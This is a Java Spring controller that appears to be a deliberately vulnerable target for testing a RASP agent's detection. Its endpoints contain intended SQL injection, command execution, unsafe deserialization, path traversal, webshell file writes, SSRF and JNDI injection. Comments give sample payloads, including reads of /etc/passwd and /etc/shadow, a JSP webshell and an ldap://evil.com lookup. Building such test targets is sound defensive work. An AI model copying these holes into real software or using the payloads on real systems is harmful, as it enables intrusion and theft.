package com.rasp.test.controller;

import org.springframework.web.bind.annotation.*;

import javax.annotation.PostConstruct;
import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.sql.Statement;
import java.util.*;
import java.util.Base64;

/**
 * 攻击测试控制器 - 包含各类安全漏洞端点
 * 
 * 用于验证 RASP Agent 的检测能力。每个端点都包含真实漏洞，
 * RASP 加载后应能检测并阻断对应的攻击行为。
 */
@RestController
@RequestMapping("/attack")
public class AttackController {

    private static final String DB_URL = "jdbc:h2:mem:testdb;DB_CLOSE_DELAY=-1";
    private static final String DB_USER = "sa";
    private static final String DB_PASS = "";

    /**
     * 初始化测试数据库
     */
    @PostConstruct
    public void initDatabase() throws Exception {
        Connection conn = DriverManager.getConnection(DB_URL, DB_USER, DB_PASS);
        Statement stmt = conn.createStatement();
        stmt.execute("CREATE TABLE IF NOT EXISTS users (id INT PRIMARY KEY, username VARCHAR(50), password VARCHAR(50))");
        stmt.execute("INSERT INTO users VALUES (1, 'admin', 'admin123')");
        stmt.execute("INSERT INTO users VALUES (2, 'user', 'pass456')");
        stmt.close();
        conn.close();
    }

    // ============================================================
    // 1. SQL 注入 (SQL Injection)
    // ============================================================

    /**
     * SQL注入 - 字符串拼接方式
     * 示例: /attack/sql/raw?username=admin' OR '1'='1
     */
    @GetMapping("/sql/raw")
    public Map<String, Object> sqlRawInjection(@RequestParam String username) {
        Map<String, Object> result = new HashMap<>();
        try {
            Connection conn = DriverManager.getConnection(DB_URL, DB_USER, DB_PASS);
            // 漏洞: 直接拼接 SQL，未使用 PreparedStatement
            String sql = "SELECT * FROM users WHERE username = '" + username + "'";
            Statement stmt = conn.createStatement();
            ResultSet rs = stmt.executeQuery(sql);
            
            List<Map<String, String>> rows = new ArrayList<>();
            while (rs.next()) {
                Map<String, String> row = new HashMap<>();
                row.put("id", rs.getString("id"));
                row.put("username", rs.getString("username"));
                row.put("password", rs.getString("password"));
                rows.add(row);
            }
            rs.close();
            stmt.close();
            conn.close();
            
            result.put("success", true);
            result.put("sql", sql);
            result.put("rows", rows);
        } catch (Exception e) {
            result.put("success", false);
            result.put("error", e.getMessage());
        }
        return result;
    }

    /**
     * SQL注入 - Statement.execute 方式
     * 示例: /attack/sql/execute?stmt=DROP TABLE users
     */
    @GetMapping("/sql/execute")
    public Map<String, Object> sqlExecute(@RequestParam String stmt) {
        Map<String, Object> result = new HashMap<>();
        try {
            Connection conn = DriverManager.getConnection(DB_URL, DB_USER, DB_PASS);
            // 漏洞: 直接执行用户输入的 SQL
            Statement statement = conn.createStatement();
            boolean isResultSet = statement.execute(stmt);
            statement.close();
            conn.close();
            
            result.put("success", true);
            result.put("executed", stmt);
            result.put("isResultSet", isResultSet);
        } catch (Exception e) {
            result.put("success", false);
            result.put("error", e.getMessage());
        }
        return result;
    }

    /**
     * SQL注入 - 联合查询
     * 示例: /attack/sql/union?id=1 UNION SELECT 1,2,3,4
     */
    @GetMapping("/sql/union")
    public Map<String, Object> sqlUnion(@RequestParam String id) {
        Map<String, Object> result = new HashMap<>();
        try {
            Connection conn = DriverManager.getConnection(DB_URL, DB_USER, DB_PASS);
            String sql = "SELECT * FROM users WHERE id = " + id;
            Statement stmt = conn.createStatement();
            ResultSet rs = stmt.executeQuery(sql);
            
            List<String> columns = new ArrayList<>();
            while (rs.next()) {
                for (int i = 1; i <= rs.getMetaData().getColumnCount(); i++) {
                    columns.add(rs.getString(i));
                }
            }
            rs.close();
            stmt.close();
            conn.close();
            
            result.put("success", true);
            result.put("sql", sql);
            result.put("result", columns);
        } catch (Exception e) {
            result.put("success", false);
            result.put("error", e.getMessage());
        }
        return result;
    }

    // ============================================================
    // 2. 命令执行 (Command Execution)
    // ============================================================

    /**
     * 命令执行 - Runtime.exec 方式
     * 示例: /attack/cmd/exec?cmd=whoami
     */
    @GetMapping("/cmd/exec")
    public Map<String, Object> cmdExec(@RequestParam String cmd) {
        Map<String, Object> result = new HashMap<>();
        try {
            // 漏洞: 直接执行用户输入的命令
            Process process = Runtime.getRuntime().exec(cmd);
            BufferedReader reader = new BufferedReader(
                new InputStreamReader(process.getInputStream()));
            StringBuilder output = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                output.append(line).append("\n");
            }
            reader.close();
            process.waitFor();
            
            result.put("success", true);
            result.put("command", cmd);
            result.put("output", output.toString());
            result.put("exitCode", process.exitValue());
        } catch (Exception e) {
            result.put("success", false);
            result.put("error", e.getMessage());
        }
        return result;
    }

    /**
     * 命令执行 - ProcessBuilder 方式
     * 示例: /attack/cmd/process?cmd=whoami
     */
    @GetMapping("/cmd/process")
    public Map<String, Object> cmdProcessBuilder(@RequestParam String cmd) {
        Map<String, Object> result = new HashMap<>();
        try {
            // 漏洞: ProcessBuilder 执行用户命令
            ProcessBuilder pb = new ProcessBuilder(cmd.split(" "));
            Process process = pb.start();
            BufferedReader reader = new BufferedReader(
                new InputStreamReader(process.getInputStream()));
            StringBuilder output = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                output.append(line).append("\n");
            }
            reader.close();
            process.waitFor();
            
            result.put("success", true);
            result.put("command", cmd);
            result.put("output", output.toString());
        } catch (Exception e) {
            result.put("success", false);
            result.put("error", e.getMessage());
        }
        return result;
    }

    /**
     * 命令执行 - 复杂命令 (管道/重定向)
     * 示例: /attack/cmd/chain?cmd=ping -c 1 127.0.0.1;id
     */
    @GetMapping("/cmd/chain")
    public Map<String, Object> cmdChain(@RequestParam String cmd) {
        Map<String, Object> result = new HashMap<>();
        try {
            // 漏洞: 通过 shell 执行复杂命令
            String[] shellCmd = {"bash", "-c", cmd};
            Process process = Runtime.getRuntime().exec(shellCmd);
            BufferedReader reader = new BufferedReader(
                new InputStreamReader(process.getInputStream()));
            BufferedReader errReader = new BufferedReader(
                new InputStreamReader(process.getErrorStream()));
            StringBuilder output = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                output.append(line).append("\n");
            }
            while ((line = errReader.readLine()) != null) {
                output.append("[ERR] ").append(line).append("\n");
            }
            reader.close();
            errReader.close();
            process.waitFor();
            
            result.put("success", true);
            result.put("command", cmd);
            result.put("output", output.toString());
        } catch (Exception e) {
            result.put("success", false);
            result.put("error", e.getMessage());
        }
        return result;
    }

    // ============================================================
    // 3. 反序列化 (Deserialization)
    // ============================================================

    /**
     * 反序列化 - 从Base64数据反序列化对象
     * 示例: /attack/deser/base64?data=rO0ABX...
     */
    @PostMapping("/deser/base64")
    public Map<String, Object> deserFromBase64(@RequestParam String data) {
        Map<String, Object> result = new HashMap<>();
        try {
            // 漏洞: 反序列化不受信任的数据
            byte[] bytes = Base64.getDecoder().decode(data);
            ObjectInputStream ois = new ObjectInputStream(
                new ByteArrayInputStream(bytes));
            Object obj = ois.readObject();
            ois.close();
            
            result.put("success", true);
            result.put("class", obj.getClass().getName());
            result.put("data", obj.toString());
        } catch (Exception e) {
            result.put("success", false);
            result.put("error", e.getMessage());
            result.put("errorClass", e.getClass().getName());
        }
        return result;
    }

    /**
     * 反序列化 - 从请求体读取序列化数据
     */
    @PostMapping("/deser/raw")
    public Map<String, Object> deserFromRaw(@RequestBody byte[] data) {
        Map<String, Object> result = new HashMap<>();
        try {
            ObjectInputStream ois = new ObjectInputStream(
                new ByteArrayInputStream(data));
            Object obj = ois.readObject();
            ois.close();
            
            result.put("success", true);
            result.put("class", obj.getClass().getName());
        } catch (Exception e) {
            result.put("success", false);
            result.put("error", e.getMessage());
        }
        return result;
    }

    /**
     * 反序列化 - 从文件读取
     * 示例: /attack/deser/file?filePath=/tmp/evil.ser
     */
    @GetMapping("/deser/file")
    public Map<String, Object> deserFromFile(@RequestParam String filePath) {
        Map<String, Object> result = new HashMap<>();
        try {
            // 漏洞: 从用户指定路径反序列化
            FileInputStream fis = new FileInputStream(filePath);
            ObjectInputStream ois = new ObjectInputStream(fis);
            Object obj = ois.readObject();
            ois.close();
            fis.close();
            
            result.put("success", true);
            result.put("class", obj.getClass().getName());
        } catch (Exception e) {
            result.put("success", false);
            result.put("error", e.getMessage());
        }
        return result;
    }

    // ============================================================
    // 4. 文件操作 (File Operations / Path Traversal)
    // ============================================================

    /**
     * 路径遍历 - 读文件
     * 示例: /attack/file/read?fileName=../../../etc/passwd
     */
    @GetMapping("/file/read")
    public Map<String, Object> fileRead(@RequestParam String fileName) {
        Map<String, Object> result = new HashMap<>();
        try {
            // 漏洞: 未校验路径，可遍历任意文件
            File file = new File(fileName);
            FileInputStream fis = new FileInputStream(file);
            BufferedReader reader = new BufferedReader(
                new InputStreamReader(fis));
            StringBuilder content = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                content.append(line).append("\n");
            }
            reader.close();
            
            result.put("success", true);
            result.put("file", file.getCanonicalPath());
            result.put("exists", file.exists());
            result.put("content", content.toString());
            result.put("length", file.length());
        } catch (Exception e) {
            result.put("success", false);
            result.put("error", e.getMessage());
        }
        return result;
    }

    /**
     * 任意文件写入 - WebShell 上传
     * 示例: POST /attack/file/write?fileName=/var/www/shell.jsp&content=<%Runtime.getRuntime().exec(request.getParameter("cmd"))%>
     */
    @PostMapping("/file/write")
    public Map<String, Object> fileWrite(@RequestParam String fileName,
                                          @RequestParam String content) {
        Map<String, Object> result = new HashMap<>();
        try {
            // 漏洞: 未校验路径和内容，可直接写WebShell
            File file = new File(fileName);
            // 确保父目录存在
            if (file.getParentFile() != null) {
                file.getParentFile().mkdirs();
            }
            FileOutputStream fos = new FileOutputStream(file);
            fos.write(content.getBytes("UTF-8"));
            fos.close();
            
            result.put("success", true);
            result.put("file", file.getCanonicalPath());
            result.put("written", content.length());
        } catch (Exception e) {
            result.put("success", false);
            result.put("error", e.getMessage());
        }
        return result;
    }

    /**
     * 敏感文件读取
     * 示例: /attack/file/sensitive?path=/etc/shadow
     */
    @GetMapping("/file/sensitive")
    public Map<String, Object> fileSensitive(@RequestParam String path) {
        Map<String, Object> result = new HashMap<>();
        try {
            FileInputStream fis = new FileInputStream(path);
            byte[] data = new byte[4096];
            int len = fis.read(data);
            fis.close();
            
            result.put("success", true);
            result.put("path", path);
            result.put("bytesRead", len);
            result.put("preview", new String(data, 0, Math.min(len, 200)));
        } catch (Exception e) {
            result.put("success", false);
            result.put("error", e.getMessage());
        }
        return result;
    }

    // ============================================================
    // 5. SSRF (Server-Side Request Forgery)
    // ============================================================

    /**
     * SSRF - HTTP GET 请求
     * 示例: /attack/ssrf/get?url=http://169.254.169.254/latest/meta-data/
     */
    @GetMapping("/ssrf/get")
    public Map<String, Object> ssrfGet(@RequestParam String url) {
        Map<String, Object> result = new HashMap<>();
        try {
            // 漏洞: 未校验目标 URL，可请求内网服务
            URL target = new URL(url);
            HttpURLConnection conn = (HttpURLConnection) target.openConnection();
            conn.setRequestMethod("GET");
            conn.setConnectTimeout(5000);
            conn.setReadTimeout(5000);
            
            BufferedReader reader = new BufferedReader(
                new InputStreamReader(conn.getInputStream()));
            StringBuilder response = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                response.append(line).append("\n");
            }
            reader.close();
            conn.disconnect();
            
            result.put("success", true);
            result.put("url", url);
            result.put("responseCode", conn.getResponseCode());
            result.put("body", response.toString());
        } catch (Exception e) {
            result.put("success", false);
            result.put("error", e.getMessage());
        }
        return result;
    }

    /**
     * SSRF - 文件协议
     * 示例: /attack/ssrf/file?url=file:///etc/passwd
     */
    @GetMapping("/ssrf/file")
    public Map<String, Object> ssrfFile(@RequestParam String url) {
        Map<String, Object> result = new HashMap<>();
        try {
            URL target = new URL(url);
            BufferedReader reader = new BufferedReader(
                new InputStreamReader(target.openStream()));
            StringBuilder content = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                content.append(line).append("\n");
            }
            reader.close();
            
            result.put("success", true);
            result.put("url", url);
            result.put("content", content.toString());
        } catch (Exception e) {
            result.put("success", false);
            result.put("error", e.getMessage());
        }
        return result;
    }

    /**
     * SSRF - POST 请求
     */
    @PostMapping("/ssrf/post")
    public Map<String, Object> ssrfPost(@RequestParam String url,
                                         @RequestBody String body) {
        Map<String, Object> result = new HashMap<>();
        try {
            URL target = new URL(url);
            HttpURLConnection conn = (HttpURLConnection) target.openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.getOutputStream().write(body.getBytes());
            
            BufferedReader reader = new BufferedReader(
                new InputStreamReader(conn.getInputStream()));
            StringBuilder response = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                response.append(line).append("\n");
            }
            reader.close();
            conn.disconnect();
            
            result.put("success", true);
            result.put("url", url);
            result.put("responseCode", conn.getResponseCode());
            result.put("body", response.toString());
        } catch (Exception e) {
            result.put("success", false);
            result.put("error", e.getMessage());
        }
        return result;
    }

    // ============================================================
    // 6. JNDI 注入 (JNDI Injection)
    // ============================================================

    /**
     * JNDI注入 - LDAP/RMI 远程对象加载
     * 示例: /attack/jndi/lookup?name=ldap://evil.com:1389/Exploit
     */
    @GetMapping("/jndi/lookup")
    public Map<String, Object> jndiLookup(@RequestParam String name) {
        Map<String, Object> result = new HashMap<>();
        try {
            // 漏洞: 使用用户可控的 JNDI 名进行查找
            javax.naming.InitialContext ctx = new javax.naming.InitialContext();
            Object obj = ctx.lookup(name);
            ctx.close();
            
            result.put("success", true);
            result.put("name", name);
            result.put("class", obj != null ? obj.getClass().getName() : "null");
        } catch (Exception e) {
            result.put("success", false);
            result.put("error", e.getMessage());
        }
        return result;
    }

    /**
     * JNDI注入 - DNS 协议
     * 示例: /attack/jndi/dns?name=dns://evil.com/query
     */
    @GetMapping("/jndi/dns")
    public Map<String, Object> jndiDns(@RequestParam String name) {
        Map<String, Object> result = new HashMap<>();
        try {
            javax.naming.InitialContext ctx = new javax.naming.InitialContext();
            Object obj = ctx.lookup(name);
            ctx.close();
            
            result.put("success", true);
            result.put("name", name);
        } catch (Exception e) {
            result.put("success", false);
            result.put("error", e.getMessage());
        }
        return result;
    }

    // ============================================================
    // 首页 - 列出所有测试端点
    // ============================================================

    @GetMapping("/")
    public Map<String, Object> index() {
        Map<String, Object> info = new LinkedHashMap<>();
        info.put("application", "RASP Test Target");
        info.put("description", "Vulnerable web application for RASP detection testing");
        info.put("endpoints", new String[]{
            "GET  /attack/sql/raw?username=xxx      - SQL字符串拼接注入",
            "GET  /attack/sql/execute?stmt=xxx      - Statement.execute注入",
            "GET  /attack/sql/union?id=xxx           - SQL联合查询注入",
            "GET  /attack/cmd/exec?cmd=xxx            - Runtime.exec命令执行",
            "GET  /attack/cmd/process?cmd=xxx         - ProcessBuilder命令执行",
            "GET  /attack/cmd/chain?cmd=xxx           - bash -c 命令执行",
            "POST /attack/deser/base64?data=xxx       - Base64反序列化",
            "POST /attack/deser/raw                   - 二进制反序列化",
            "GET  /attack/deser/file?filePath=xxx     - 文件反序列化",
            "GET  /attack/file/read?fileName=xxx      - 路径遍历读文件",
            "POST /attack/file/write?fileName=xxx&content=xxx - 任意文件写入",
            "GET  /attack/file/sensitive?path=xxx     - 敏感文件读取",
            "GET  /attack/ssrf/get?url=xxx            - SSRF GET请求",
            "GET  /attack/ssrf/file?url=xxx           - SSRF file协议",
            "POST /attack/ssrf/post?url=xxx           - SSRF POST请求",
            "GET  /attack/jndi/lookup?name=xxx        - JNDI注入(LDAP/RMI)",
            "GET  /attack/jndi/dns?name=xxx           - JNDI注入(DNS)"
        });
        return info;
    }
}
